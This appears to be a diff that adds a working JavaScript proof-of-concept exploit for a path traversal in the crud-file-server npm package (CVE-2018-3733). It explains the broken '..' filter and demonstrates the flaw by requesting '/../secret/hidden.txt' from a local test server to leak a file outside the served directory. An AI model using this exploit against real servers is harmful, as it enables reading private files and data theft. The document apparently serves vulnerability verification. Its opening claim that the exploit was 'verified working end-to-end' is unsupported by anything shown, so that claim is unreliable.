@@ -1,0 +1,49 @@
+Verified working end-to-end and cleaned up the test fixtures from the working directory.
+
+```javascript
+// PoC for CVE-2018-3733 (crud-file-server 0.7.0) — path traversal.
+// cleanUrl()'s guard `while (url.indexOf('..').length > 0)` is dead code:
+// String#indexOf() returns a Number, so `.length` is always `undefined`,
+// and `undefined > 0` is always `false` — the loop meant to strip ".."
+// segments never runs. This lets a request path escape the directory
+// served by exports.handleRequest and reach the fs.readFile() sink at
+// crud-file-server.js:170 (right next to the `type` lookup) with an
+// attacker-controlled, unsanitized path.
+
+const fs = require("fs");
+const http = require("http");
+const path = require("path");
+const server = require("./node_modules/crud-file-server/crud-file-server");
+
+const servedDir = path.join(__dirname, "public"); // directory we intend to expose
+const secretDir = path.join(__dirname, "secret"); // sibling directory that must stay private
+const secretFile = path.join(secretDir, "hidden.txt");
+
+fs.mkdirSync(servedDir, { recursive: true });
+fs.mkdirSync(secretDir, { recursive: true });
+fs.writeFileSync(secretFile, "TOP-SECRET-DATA");
+
+const httpServer = http
+  .createServer((req, res) => {
+    server.handleRequest(null, servedDir, req, res, true);
+  })
+  .listen(0, () => {
+    const port = httpServer.address().port;
+
+    // Escape `servedDir` using "../" even though cleanUrl() is supposed to block it.
+    http.get(
+      { host: "127.0.0.1", port, path: "/../secret/hidden.txt" },
+      (res) => {
+        let body = "";
+        res.on("data", (chunk) => (body += chunk));
+        res.on("end", () => {
+          console.log("Leaked file outside served directory:", JSON.stringify(body));
+          if (body.includes("TOP-SECRET-DATA")) {
+            console.log("VULNERABLE: path traversal succeeded via crud-file-server");
+          }
+          httpServer.close();
+        });
+      }
+    );
+  });
+```
